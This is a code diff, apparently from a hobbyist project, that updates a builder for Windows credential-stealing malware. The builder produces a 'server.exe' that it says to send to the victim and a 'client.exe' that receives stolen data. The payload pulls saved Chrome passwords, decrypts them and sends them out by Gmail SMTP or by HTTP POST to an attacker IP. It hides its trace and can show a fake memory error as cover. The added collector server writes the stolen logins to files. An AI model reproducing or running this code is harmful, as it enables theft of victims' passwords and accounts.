@@ -16,6 +16,8 @@ error = "0"
 email = ""
 pwd = ""
 mailto = ""
+serverlineStart = 131
+serverlineStop = 232
 
 while loop == True:
     os.system("cls")
@@ -62,41 +64,68 @@ while loop == False:
 
 def done():
     os.system('cls')
+    if option != "1":
+        print 'Client has been created under name client.exe'
     print 'Server has been created under the name server.exe\n'
+    print '\nRemember: You send the server.exe to the victim!'
     raw_input("Press Enter to continue...")
     exit()
 
 
-def py2crypt():
+def py2crypt(filename):
     sys.argv.append("py2exe")
-    setup(
-        options={'py2exe': {'bundle_files': 1, "excludes": ['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes": [
-            'msvcr71.dll', 'Crypt32.dll'], "compressed": True, "optimize": 2}},
-        windows=[{'script': "server.py",
-                  "icon_resources": [(0, "icon.ico")]}],
-        zipfile=None,
-    )
+    if filename == "client.py":
+        setup(
+            options={'py2exe': {'bundle_files': 1, "excludes": ['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes": [
+                'msvcr71.dll', 'Crypt32.dll'], "compressed": True, "optimize": 2}},
+            console=[{'script': filename,
+                      "icon_resources": [(0, "icon.ico")]}],
+            zipfile=None,
+        )
 
-#  'uac_info': "requireAdministrator"
-
-    if os.path.exists('server.exe'):
-        os.remove('server.exe')
-    os.rename('dist/server.exe', 'server.exe')
-    rmtree('build/')
-    rmtree('dist/')
+        if os.path.exists('client.exe'):
+            os.remove('client.exe')
+        os.rename('dist/client.exe', 'client.exe')
+    else:
+        setup(
+            options={'py2exe': {'bundle_files': 1, "excludes": ['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes": [
+                'msvcr71.dll', 'Crypt32.dll'], "compressed": True, "optimize": 2}},
+            windows=[{'script': filename,
+                      "icon_resources": [(0, "icon.ico")]}],
+            zipfile=None,
+            #  'uac_info': "requireAdministrator"
+        )
+        if os.path.exists('server.exe'):
+            os.remove('server.exe')
+        os.rename('dist/server.exe', 'server.exe')
+        rmtree('build/')
+        rmtree('dist/')
 
 
 with open('create_server.py') as f1:
     with open('server.py', 'w') as f2:
         lines = f1.readlines()
-        i = 102
-        f2.write("# -*- coding: cp1250 -*-\nglobal attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' +
+        i = serverlineStart
+        f2.write("# -*- coding: utf-8 -*-\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' +
                  '\''+email + '\'' + '\n'+'pwd = ' + '\''+pwd + '\'' + '\n'+'mailto = ' + '\''+mailto + '\'' + '\n'+'error = ' + '\''+error + '\''+'\n')
-        while(i < len(lines)-1):
+        while(i < serverlineStop-1):
             f2.write(lines[i])
             i = i+1
-    # os.remove('server.py')
-    py2crypt()
+    if option != "1":
+        with open('client.py', 'w') as f3:
+            i += 1
+            while i < len(lines)-1:
+                f3.write(lines[i])
+                i = i+1
+        py2crypt("client.py")
+        print("[+] Client done building... \n[+] Building server...\n")
+    time.sleep(3)
+    py2crypt("server.py")
+    try:
+        os.remove('server.py')
+        os.remove("client.py")
+    except:
+        pass
     done()
 
 """
@@ -109,96 +138,151 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 
-destination = "password.txt"
+destination = "error.txt"
 def getpass():
 
-	path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
+    path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
 
-	path2 = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"
+    path2 = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"
 
-	ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
-	path = path.strip()
-	path = urllib.unquote(path)
-	if path.translate(ASCII_TRANS) != path:  # Contains non-ascii
-		path = path.decode('latin-1')
-	path = urllib.url2pathname(path)
+    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
+    path = path.strip()
+    path = urllib.unquote(path)
+    if path.translate(ASCII_TRANS) != path:  # Contains non-ascii
+        path = path.decode('latin-1')
+    path = urllib.url2pathname(path)
 
-	ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
-	path2 = path2.strip()
-	path2 = urllib.unquote(path2)
-	if path2.translate(ASCII_TRANS) != path2:  # Contains non-ascii
-		path2 = path2.decode('latin-1')
-	path2 = urllib.url2pathname(path2)
+    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
+    path2 = path2.strip()
+    path2 = urllib.unquote(path2)
+    if path2.translate(ASCII_TRANS) != path2:  # Contains non-ascii
+        path2 = path2.decode('latin-1')
+    path2 = urllib.url2pathname(path2)
 
-	copyfile(path, path2)
+    copyfile(path, path2)
 
-	conn = connect(path2)
+    conn = connect(path2)
 
-	cursor = conn.cursor()
+    cursor = conn.cursor()
 
-	cursor.execute(
-		'SELECT action_url, username_value, password_value FROM logins')
+    cursor.execute(
+        'SELECT action_url, username_value, password_value FROM logins')
 
-	if os.path.exists(destination):
-		os.remove(destination)
+    if os.path.exists(destination):
+        os.remove(destination)
 
-	sites = []
-	for raw in cursor.fetchall():
-		try:
-			if raw[0] not in sites:
-				if os.path.exists(destination):
-					with open(destination, "a") as password:
-						password.write('\n' + "Website: " + raw[0] + '\n' + "User\email: " + raw[1] +
-									   '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-				else:
-					with open(destination, "a") as password:
-						password.write('\n' + "Website: " + raw[0] + '\n' + "User\email: " + raw[1] +
-									   '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-				sites.append(raw[0])
-		except:
-			continue
+    sites = []
+    for raw in cursor.fetchall():
+        try:
+            if raw[0] not in sites:
+                if os.path.exists(destination):
+                    with open(destination, "a") as password:
+                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
+                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+                else:
+                    with open(destination, "a") as password:
+                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
+                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+                sites.append(raw[0])
+        except:
+            continue
 
-	conn.close()
-	return 0
+    conn.close()
+    return 0
 
 
 
 
 
 def sendpass():
-	if option == "1":
-		server = "smtp.gmail.com"
-		msg = MIMEMultipart()
-		filename = destination
-		f = open(filename)
-		attachment = MIMEText(f.read())
-		attachment.add_header('Content-Disposition',
-							  'attachment', filename=destination)
-		msg.attach(attachment)
+    if option == "1":
+        server = "smtp.gmail.com"
+        msg = MIMEMultipart()
+        filename = destination
+        f = open(filename)
+        attachment = MIMEText(f.read())
+        f.close()
+        attachment.add_header('Content-Disposition',
+                              'attachment', filename=destination)
+        msg.attach(attachment)
 
-		mailer = smtplib.SMTP(server, 587)
-		mailer.starttls()
-		mailer.login(email, pwd)
-		mailer.sendmail(email, mailto, msg.as_string())
-		mailer.close()
+        mailer = smtplib.SMTP(server, 587)
+        mailer.starttls()
+        mailer.login(email, pwd)
+        mailer.sendmail(email, mailto, msg.as_string())
+        mailer.close()
 
-	else:
-		req = get('http://' + attacker_ip)
-		path = destination
-		url = 'http://' + attacker_ip + '/store'
-		files = {'file': open(path, 'rb')}
-		r = post(url, files=files)
-		return 0
-
+    else:
+        path = destination
+        url = 'http://' + attacker_ip
+        files = {'file': open(path, 'rb')}
+        r = post(url, files=files)
+        return 0
 getpass()
 sendpass()
 try:
-	os.remove(destination)
+    os.remove(destination)
 except:
-	check_call(["attrib","+H",destination])
+    check_call(["attrib","+H",destination])
 if error == "1":
-	MB_OK = 0x00
-	MB_ICONSTOP = 0x10
-	ctypes.windll.user32.MessageBoxW(
-		None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
+    MB_OK = 0x00
+    MB_ICONSTOP = 0x10
+    ctypes.windll.user32.MessageBoxW(
+        None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
+import sys
+import os
+import BaseHTTPServer
+import urlparse
+host = '0.0.0.0'
+port = 80
+
+
+class poHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    def do_GET(self):
+        return
+
+    def do_POST(self):
+        destination = "passwords.txt"
+        add = 1
+        self.send_response(200)
+        if self.rfile:
+            print "\n\nEstablished connection from " + \
+                self.client_address[0] + \
+                " (" + str(self.client_address[1]) + " -> " + str(port) + ")"
+            if os.path.isfile(destination):
+                exist = True
+                while exist == True:
+                    try:
+                        if not os.path.isfile("passwords" + str(add) + ".txt"):
+                            exist = False
+                            destination = "passwords" + str(add) + ".txt"
+                            break
+                        add += 1
+                    except Exception as err:
+                        pass
+            with open(destination, "wb") as pfile:
+                for key, value in dict(urlparse.parse_qs(self.rfile.read(int(self.headers['Content-Length'])))).items():
+                    for i in value:
+                        pfile.write(i)
+            print "Retrieved passwords from " + \
+                self.client_address[0] + " into " + destination + "\n"
+
+    def log_message(self, format, *args):
+        return
+
+
+def run(server=BaseHTTPServer.HTTPServer,
+        handler=poHandler):
+    server_address = (host, port)
+    httpServ = server(server_address, handler)
+    try:
+        print("Waiting for connections...\n")
+        httpServ.serve_forever()
+    except KeyboardInterrupt:
+        print ('[!] Server is terminated')
+        httpServ.server_close()
+
+
+if __name__ == '__main__':
+    run()
 """
